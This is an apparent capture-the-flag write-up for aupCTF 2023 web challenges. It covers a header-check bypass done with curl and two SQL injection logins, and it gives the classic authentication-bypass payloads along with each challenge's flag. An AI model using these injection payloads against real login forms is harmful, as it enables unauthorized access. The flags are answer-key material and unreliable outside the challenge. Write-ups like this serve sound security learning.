# aupCTF 2023 writeups for WEB 
ctftime link: https://ctftime.org/event/2025/
## Starter - 100pts

![image](https://github.com/zer00d4y/writeups/assets/128820441/698c00f7-7c4e-4f4a-a183-ae622a3a6003)
![image](https://github.com/zer00d4y/writeups/assets/128820441/e2a318b7-e144-4784-87bf-28a1d5378f6d)
![image](https://github.com/zer00d4y/writeups/assets/128820441/a557168e-f0a9-4f4a-b005-8c5ac01a67a2)

FLAG: `aupCTF{w45n't-th47-h4rd-r1gh7}`

## Header - 100pts

    def headar_easy(request):
        if request.META.get('HTTP_GETFLAG') == 'yes':
        context = {
            'flag': '[REDACTED]',
        }
        
        return render(request, 'aa/flag.html', context)
    
    return render(request, 'aa/index.html')

┌──(kali㉿kali)-[~]

└─$  `curl -H "GETFLAG: yes" https://challs.aupctf.live/header/`

aupCTF{cust0m-he4d3r-r3qu3st}

FLAG: `aupCTF{cust0m-he4d3r-r3qu3st}`

## SQLi - 1 - 100pts

Simple SQL-injection, we need use basic payload: `' OR 1=1 --` we are able to get in.

![image](https://github.com/zer00d4y/writeups/assets/128820441/ffc1ba72-d930-4319-9c9e-e7543f2a3e5f)

FLAG: `aupCTF{3a5y-sql-1nj3cti0n}`

## SQLi - 2 - 200pts

Also SQL injection, we need to use this payload `-- or '1'='1'`

FLAG: `aupCTF{m3d1um-sql-1nj3cti0n}`

